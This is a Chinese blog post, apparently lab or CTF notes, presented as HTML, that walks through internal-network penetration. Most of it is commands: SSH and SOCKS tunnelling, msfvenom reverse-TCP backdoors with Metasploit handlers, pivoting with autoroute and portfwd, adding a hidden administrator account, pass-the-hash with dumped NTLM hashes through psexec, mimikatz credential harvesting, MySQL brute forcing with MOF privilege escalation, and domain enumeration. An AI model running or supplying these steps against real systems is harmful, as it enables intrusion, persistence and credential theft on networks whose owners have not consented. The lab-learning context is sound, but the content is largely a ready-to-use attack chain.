@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    内网 |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Anti-Genemits" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-内网"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  内网
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/30/%E5%86%85%E7%BD%91/" class="article-date">
+  <time datetime="2020-10-30T00:01:50.000Z" itemprop="datePublished">2020-10-30</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">9 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="内网渗透篇"><a href="#内网渗透篇" class="headerlink" title="内网渗透篇"></a>内网渗透篇</h1><h2 id="一、隧道技术-SSH"><a href="#一、隧道技术-SSH" class="headerlink" title="一、隧道技术-SSH"></a>一、隧道技术-SSH</h2><p><strong>正向链接实现</strong></p>
+<p>web 服务器执行<code>ssh –CNfL 0.0.0.0:7777:10.10.10.129:80 moon@192.168.0.144</code></p>
+<p>将10.10.10.128:80端口映射到<code>0.0.0.0:7777</code>,然后浏览器访问<code>192.168.0.144:7777</code>就能够访问内网的<code>10.10.10.129:80</code></p>
+<p><strong>反向链接实现</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -R port:host:hostport  remote_ip</span><br></pre></td></tr></table></figure>
+
+<p>这是标准的匹配的模式</p>
+<p>下面进行秀操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh –qTfnN –R 2222:127.0.0.1:22  root@192.168.0.115</span><br><span class="line">ssh –p 2222 web@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>将<code>127.0.0.1:22</code>端口转发到<code>192.168.0.115</code></p>
+<p>然后第二条命令是在攻击机上面执行，进行登陆。</p>
+<p><strong>sockets代理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSH -qTfnN -D port remotehost</span><br></pre></td></tr></table></figure>
+
+<p>然后设置代理(被攻击的服务器的ip+端口)</p>
+<h2 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h2><p>生成metasploit的后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.196  lport&#x3D;12345 -f exe &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;ss.exe</span><br></pre></td></tr></table></figure>
+
+<p>设置kali的监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload  windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.43.224</span><br><span class="line">set lport 12345</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>映射端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 192.168.43.224 -l 2020 -p 80 -r 10.10.10.128</span><br></pre></td></tr></table></figure>
+
+<p>这是将<code>10.10.10.128</code>映射到<code>192.168.43.224:2020</code></p>
+<p>转发端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 5555 -p 3389 -r 192.168.0.149</span><br><span class="line">rdesktop 127.1.1.0: 5555</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看列表</span><br><span class="line">portfwd list</span><br><span class="line">清空列表</span><br><span class="line">portfwd flush</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、Socket隧道"><a href="#三、Socket隧道" class="headerlink" title="三、Socket隧道"></a>三、Socket隧道</h2><p>编译SSOCKS程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">cd src</span><br><span class="line">.&#x2F;rcsocks -l 1088 -p 1080 -vv这样就可以直接使用了</span><br><span class="line">这样kali上的链接就已经搭建好了。</span><br><span class="line">&#x2F;rssocks -vv -s 192.168.10.50:1080 这个是在web服务器上执行</span><br></pre></td></tr></table></figure>
+
+<p>使用proxychains</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;proxychains.conf  </span><br></pre></td></tr></table></figure>
+
+<p><code>用kali 里面的nmap扫描 10.10.10.128</code></p>
+<p><code>proxychains nmap –Pn -sT 10.10.10.128</code></p>
+<p>进行内网扫描UDP的数据是扫描不出来的</p>
+<p>扫描内网的机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sT 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、跨路由扫描"><a href="#四、跨路由扫描" class="headerlink" title="四、跨路由扫描"></a>四、跨路由扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">生成metasploit后门windows</span><br><span class="line">msfvenom  -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.196  lport&#x3D;12345 -f exe &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;s.exe</span><br><span class="line">kali监听</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload  windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.0.196</span><br><span class="line">set lport 12345</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>然后进行基本信息的获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户</span><br><span class="line">getuid</span><br><span class="line">获取网卡信息</span><br><span class="line">ifconfig</span><br><span class="line">路由信息</span><br><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p>下面继续使用kaili进行操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">增加路由</span><br><span class="line">run autoroute  -s 10.10.10.0&#x2F;24</span><br><span class="line">run autoroute –p查看是否增加了路由</span><br><span class="line">background</span><br><span class="line">搭建socks链接服务</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">show options</span><br><span class="line">set SRVPORT	10044随便设置，然后挂上sock隧道就可以了</span><br><span class="line">run</span><br><span class="line">&#x2F;etc&#x2F;prxoychains.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、常见的内网测试"><a href="#五、常见的内网测试" class="headerlink" title="五、常见的内网测试"></a>五、常见的内网测试</h2><p>大概信息如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali   192.168.43.224 </span><br><span class="line">2003 192.168.43.115 192.168.111.132</span><br><span class="line">ubuntu 192.168.111.128 </span><br></pre></td></tr></table></figure>
+
+<p>首先生成攻击载荷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.43.224  lport&#x3D;12345 -f exe &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;s.exe(kali)</span><br></pre></td></tr></table></figure>
+
+<p>本地监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.43.224</span><br><span class="line">set lport 12345</span><br><span class="line">exploit</span><br><span class="line">注意这些lhost和lport要和攻击载荷中的一致</span><br></pre></td></tr></table></figure>
+
+<p>开始操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route 查看路由表 网关等信息均能查看</span><br><span class="line">ps 查看进程</span><br></pre></td></tr></table></figure>
+
+<p>现在将metasploit注入到其他的进程里面，保证每次都能进入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getprivs 尽可能提升权限</span><br><span class="line">getsystem 获得系统权限</span><br><span class="line">shell 进入cmd中</span><br><span class="line">net user moon$ moon123 &#x2F;add &amp; net localground administrators moon$ &#x2F;add增加用户</span><br><span class="line">run post&#x2F;multi&#x2F;gather&#x2F;ping_sweep RHOSTS&#x3D;10.10.10.0&#x2F;24 检测存活ip</span><br></pre></td></tr></table></figure>
+
+<p>socket代理 用namp扫描内网的ip服务，首先增加一个路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute 增加一个路由</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a 选择这个</span><br><span class="line">set SRVHOST 192.168.43.224 socke 隧道</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>设置proxychains代理 来进行扫描端口，这里就相当于在用目标机器进行nmap扫描内网了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socks4 192.168.43.224 1080 1080这是默认端口</span><br><span class="line">proxychains nmap -sT -Pn -p 445,22,80,3306 192.168.111.128-132 --open -oN 192.168.111.txt</span><br><span class="line">扫描445 22 80 3306 的ip段为128-132，如果有就保存到后面的文件中 比较耗时间 这个扫描比较简单</span><br></pre></td></tr></table></figure>
+
+<p>现在换成之前的msf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">获取当前服务器的hash</span><br><span class="line">Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">ASPNET:1006:b6cdaa6dd10a6155b54d6886c7b4b8f4:570c90ed6cca2f86b06241a2e5e0c3df:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_WWW-C4D593E2D2C:1000:44566b28c2e9a8f2d6aba8863bf7093c:2d8b5c5e471954a4ff306dff1b311cc6:::</span><br><span class="line">IWAM_WWW-C4D593E2D2C:1001:80e1bd999815342156825c6c4818ef78:7c7ee5557864c448aba74604255eeac2:::</span><br><span class="line">MYSQL_ZKEYS:1007:967b40abb061261ca53c143f4b0a15b4:9cd4bf9a7d90202f70773dd421c304a9:::</span><br><span class="line">PhpMyAdmin_ZKEYS:1008:152a9049175e2f6a9afa378be4aedf15:184d679e2df3b67dd7ae1c2a854495a3:::</span><br><span class="line">SUPPORT_388945a0:1004:aad3b435b51404eeaad3b435b51404ee:eb84cedb36588cbaf2bf1b9a64905ce5:::</span><br></pre></td></tr></table></figure>
+
+<p>445端口打开，开启hash攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec    --&gt;使用这个渗透攻击模块</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp </span><br><span class="line">show options                      --&gt;查看配置选项</span><br><span class="line">set RHOST 192.168.111.132           --&gt;设置攻击目标192.168.2.107，端口默认445</span><br><span class="line">set SMBUser Administrator                  --&gt;设置账号为wing</span><br><span class="line">set SMBPass 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">exploit                           --&gt;执行攻击</span><br></pre></td></tr></table></figure>
+
+<p>然后来一个hash在先加解密：<a target="_blank" rel="noopener" href="http://www.objectif-securite.ch/ophcrack.php%E5%85%B6%E4%B8%AD%E5%AF%86%E7%A0%81%E6%98%AF%E5%90%8E%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%80%E7%AA%9C%E6%95%B0%E5%AD%97%E3%80%82">http://www.objectif-securite.ch/ophcrack.php其中密码是后面的那一窜数字。</a></p>
+<p>然后我们就得到了一个新的session</p>
+<p>下面进行密码收集</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz 这是一个插件</span><br><span class="line">msv 收集密码</span><br><span class="line">kerberos 查看是不是有明文密码</span><br><span class="line">run  getgui  -e 开启他的远程链接</span><br><span class="line">增加用户run getgui -u moonsec -p moonsec</span><br><span class="line">proxychains rdesktop -u Administrator -p 123456 192.168.111.132</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、域的搭建"><a href="#六、域的搭建" class="headerlink" title="六、域的搭建"></a>六、域的搭建</h2><p>参考链接:<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/19192ad8e1593ae53e5707be.html">https://jingyan.baidu.com/article/19192ad8e1593ae53e5707be.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域控2008：jsp，adminstrator  xxx123456.. 10.10.1.2</span><br><span class="line">域的客户机2008：靶机 xxx333.. 10.10.1.4 192.168.43.225</span><br><span class="line">域的客户机2003 xxx222.. 10.10.1.3</span><br><span class="line">dcpromo.exe</span><br></pre></td></tr></table></figure>
+
+<p>配置域，创建用户</p>
+<h2 id="七、一次完整的域渗透"><a href="#七、一次完整的域渗透" class="headerlink" title="七、一次完整的域渗透"></a>七、一次完整的域渗透</h2><p>首先打通后门，进入他，然后提升一下权限。</p>
+<p>域的简介：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/windows%E5%9F%9F/1492318">https://baike.baidu.com/item/windows%E5%9F%9F/1492318</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看一下网络 net view</span><br><span class="line">进入shell 查看一下网络DNS等服务信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;10.10.10.0&#x2F;24</span><br><span class="line">DNS一般和主域是搭建在一起的</span><br></pre></td></tr></table></figure>
+
+<p>被控制的靶机的路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">IPv4 network routes</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Subnet           Netmask          Gateway         Metric  Interface</span><br><span class="line">    ------           -------          -------         ------  ---------</span><br><span class="line">    0.0.0.0          0.0.0.0          192.168.43.183  10      13</span><br><span class="line">    10.10.1.0        255.255.255.0    10.10.1.4       266     11</span><br><span class="line">    10.10.1.4        255.255.255.255  10.10.1.4       266     11</span><br><span class="line">    10.10.1.255      255.255.255.255  10.10.1.4       266     11</span><br><span class="line">    127.0.0.0        255.0.0.0        127.0.0.1       306     1</span><br><span class="line">    127.0.0.1        255.255.255.255  127.0.0.1       306     1</span><br><span class="line">    127.255.255.255  255.255.255.255  127.0.0.1       306     1</span><br><span class="line">    192.168.43.0     255.255.255.0    192.168.43.225  266     13</span><br><span class="line">    192.168.43.225   255.255.255.255  192.168.43.225  266     13</span><br><span class="line">    192.168.43.255   255.255.255.255  192.168.43.225  266     13</span><br><span class="line">    224.0.0.0        240.0.0.0        127.0.0.1       306     1</span><br><span class="line">    224.0.0.0        240.0.0.0        10.10.1.4       266     11</span><br><span class="line">    224.0.0.0        240.0.0.0        192.168.43.225  266     13</span><br><span class="line">    255.255.255.255  255.255.255.255  127.0.0.1       306     1</span><br><span class="line">    255.255.255.255  255.255.255.255  10.10.1.4       266     11</span><br><span class="line">    255.255.255.255  255.255.255.255  192.168.43.225  266     13</span><br></pre></td></tr></table></figure>
+
+<p>操作继续</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在background中进行route  add 10.10.1.4 255.255.255.0 1</span><br><span class="line">扫描端口的插件</span><br><span class="line">use scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTA 10.10.1.3</span><br><span class="line"></span><br><span class="line">扫描得到mysql服务，然后就是搞死他</span><br><span class="line">use scanner&#x2F;mysql&#x2F;mysql_login</span><br><span class="line">set PASS_FILE &#x2F;etc&#x2F;passwd.txt</span><br><span class="line">set USERNAME root</span><br><span class="line">然后通过mysql来提权</span><br><span class="line">use windows&#x2F;mysql&#x2F;mysql_mof</span><br><span class="line">set PASSWORD 123456</span><br><span class="line">set rhost 10.10.1.3</span><br><span class="line">set USERNAME root</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br><span class="line">继续提权</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<p>下一步拿到system权限后继续跑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view &#x2F;domain:moonsec 查看当前域的计算机</span><br><span class="line">通过ping获得客户机的ip地址</span><br><span class="line">net user &#x2F;domain 查看当前域的所有用户</span><br><span class="line">net group &#x2F;domain 获得当前域的用户组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain 获得管理员的名字</span><br><span class="line">因为普通域用户更改系统信息都需要通过域管理员的验证</span><br></pre></td></tr></table></figure>
+
+<p>获取明文密码，拿到3389端口，获取sessions大法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line"> set RHOST 10.10.1.2</span><br><span class="line"> set SMBUser administrator</span><br><span class="line"> set SMBPass xxx123456..</span><br><span class="line"> set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>获取hash ： <code>run post/windows/gather/hashdump</code></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/10/30/%E5%86%85%E7%BD%91/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/10/30/SSI/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            SSI
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/10/26/PHP-INI/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">PHP.INI</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2020
+        <i class="ri-heart-fill heart_icon"></i> 码农
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by Hexo
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/anti-genemits" target="_blank">Anti-Genemits</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Anti-Genemits"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E7%BC%96%E7%A8%8B/">编程</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/CTF/">CTF</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
